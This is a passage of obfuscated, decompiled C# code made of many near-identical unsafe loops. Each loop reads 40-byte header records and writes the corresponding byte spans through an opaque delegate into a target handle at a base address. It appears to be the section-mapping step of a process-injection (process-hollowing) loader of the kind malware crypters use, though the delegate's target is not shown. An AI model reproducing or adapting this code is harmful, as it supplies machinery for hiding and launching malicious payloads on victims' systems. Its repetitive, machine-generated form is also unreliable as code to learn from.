						*unchecked((int*)((byte*)ptr + 1548)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1552)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1556)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3985] = ((*(int*)((byte*)ptr + 1552) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3985] != 0)
					{
						byte[] array128;
						checked
						{
							array128 = new byte[*unchecked((int*)((byte*)ptr + 1552)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1556), array128, 0, array128.Length);
						((byte*)ptr)[3986] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1548))), array128, array128.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3986] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3990] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3990] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1560)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1564)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1568)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3988] = ((*(int*)((byte*)ptr + 1564) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3988] != 0)
					{
						byte[] array129;
						checked
						{
							array129 = new byte[*unchecked((int*)((byte*)ptr + 1564)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1568), array129, 0, array129.Length);
						((byte*)ptr)[3989] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1560))), array129, array129.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3989] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3993] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3993] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1572)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1576)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1580)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3991] = ((*(int*)((byte*)ptr + 1576) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3991] != 0)
					{
						byte[] array130;
						checked
						{
							array130 = new byte[*unchecked((int*)((byte*)ptr + 1576)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1580), array130, 0, array130.Length);
						((byte*)ptr)[3992] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1572))), array130, array130.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3992] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3996] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3996] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1584)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1588)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1592)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3994] = ((*(int*)((byte*)ptr + 1588) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3994] != 0)
					{
						byte[] array131;
						checked
						{
							array131 = new byte[*unchecked((int*)((byte*)ptr + 1588)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1592), array131, 0, array131.Length);
						((byte*)ptr)[3995] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1584))), array131, array131.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3995] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3999] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3999] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1596)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1600)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1604)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3997] = ((*(int*)((byte*)ptr + 1600) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3997] != 0)
					{
						byte[] array132;
						checked
						{
							array132 = new byte[*unchecked((int*)((byte*)ptr + 1600)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1604), array132, 0, array132.Length);
						((byte*)ptr)[3998] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1596))), array132, array132.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3998] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4002] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4002] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1608)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1612)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1616)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4000] = ((*(int*)((byte*)ptr + 1612) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4000] != 0)
					{
						byte[] array133;
						checked
						{
							array133 = new byte[*unchecked((int*)((byte*)ptr + 1612)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1616), array133, 0, array133.Length);
						((byte*)ptr)[4001] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1608))), array133, array133.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4001] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4005] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4005] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1620)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1624)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1628)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4003] = ((*(int*)((byte*)ptr + 1624) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4003] != 0)
					{
						byte[] array134;
						checked
						{
							array134 = new byte[*unchecked((int*)((byte*)ptr + 1624)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1628), array134, 0, array134.Length);
						((byte*)ptr)[4004] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1620))), array134, array134.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4004] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4008] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4008] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1632)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1636)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1640)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4006] = ((*(int*)((byte*)ptr + 1636) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4006] != 0)
					{
						byte[] array135;
						checked
						{
							array135 = new byte[*unchecked((int*)((byte*)ptr + 1636)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1640), array135, 0, array135.Length);
						((byte*)ptr)[4007] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1632))), array135, array135.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4007] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4011] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4011] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1644)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1648)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1652)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4009] = ((*(int*)((byte*)ptr + 1648) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4009] != 0)
					{
						byte[] array136;
						checked
						{
							array136 = new byte[*unchecked((int*)((byte*)ptr + 1648)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1652), array136, 0, array136.Length);
						((byte*)ptr)[4010] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1644))), array136, array136.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4010] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4014] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4014] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1656)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1660)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1664)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4012] = ((*(int*)((byte*)ptr + 1660) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4012] != 0)
					{
						byte[] array137;
						checked
						{
							array137 = new byte[*unchecked((int*)((byte*)ptr + 1660)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1664), array137, 0, array137.Length);
						((byte*)ptr)[4013] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1656))), array137, array137.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4013] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4017] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4017] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1668)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1672)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1676)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4015] = ((*(int*)((byte*)ptr + 1672) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4015] != 0)
					{
						byte[] array138;
						checked
						{
							array138 = new byte[*unchecked((int*)((byte*)ptr + 1672)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1676), array138, 0, array138.Length);
						((byte*)ptr)[4016] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1668))), array138, array138.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4016] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4020] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4020] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1680)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1684)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1688)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4018] = ((*(int*)((byte*)ptr + 1684) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4018] != 0)
					{
						byte[] array139;
						checked
						{
							array139 = new byte[*unchecked((int*)((byte*)ptr + 1684)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1688), array139, 0, array139.Length);
						((byte*)ptr)[4019] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1680))), array139, array139.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4019] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4023] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4023] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1692)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1696)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1700)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4021] = ((*(int*)((byte*)ptr + 1696) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4021] != 0)
					{
						byte[] array140;
						checked
						{
							array140 = new byte[*unchecked((int*)((byte*)ptr + 1696)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1700), array140, 0, array140.Length);
						((byte*)ptr)[4022] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1692))), array140, array140.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4022] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4026] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4026] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1704)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1708)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1712)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4024] = ((*(int*)((byte*)ptr + 1708) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4024] != 0)
					{
						byte[] array141;
						checked
						{
							array141 = new byte[*unchecked((int*)((byte*)ptr + 1708)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1712), array141, 0, array141.Length);
						((byte*)ptr)[4025] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1704))), array141, array141.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4025] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4029] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4029] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1716)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1720)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1724)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4027] = ((*(int*)((byte*)ptr + 1720) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4027] != 0)
					{
						byte[] array142;
						checked
						{
							array142 = new byte[*unchecked((int*)((byte*)ptr + 1720)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1724), array142, 0, array142.Length);
						((byte*)ptr)[4028] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1716))), array142, array142.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4028] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4032] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4032] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1728)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1732)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1736)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4030] = ((*(int*)((byte*)ptr + 1732) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4030] != 0)
					{
						byte[] array143;
						checked
						{
							array143 = new byte[*unchecked((int*)((byte*)ptr + 1732)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1736), array143, 0, array143.Length);
						((byte*)ptr)[4031] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1728))), array143, array143.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4031] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4035] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4035] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1740)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1744)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1748)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4033] = ((*(int*)((byte*)ptr + 1744) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4033] != 0)
					{
						byte[] array144;
						checked
						{
							array144 = new byte[*unchecked((int*)((byte*)ptr + 1744)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1748), array144, 0, array144.Length);
						((byte*)ptr)[4034] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1740))), array144, array144.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4034] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4038] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4038] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1752)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1756)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1760)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4036] = ((*(int*)((byte*)ptr + 1756) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4036] != 0)
					{
						byte[] array145;
						checked
						{
							array145 = new byte[*unchecked((int*)((byte*)ptr + 1756)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1760), array145, 0, array145.Length);
						((byte*)ptr)[4037] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1752))), array145, array145.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4037] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4041] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4041] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1764)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1768)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1772)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4039] = ((*(int*)((byte*)ptr + 1768) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4039] != 0)
					{
						byte[] array146;
						checked
						{
							array146 = new byte[*unchecked((int*)((byte*)ptr + 1768)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1772), array146, 0, array146.Length);
						((byte*)ptr)[4040] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1764))), array146, array146.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4040] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4044] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4044] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1776)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1780)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1784)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
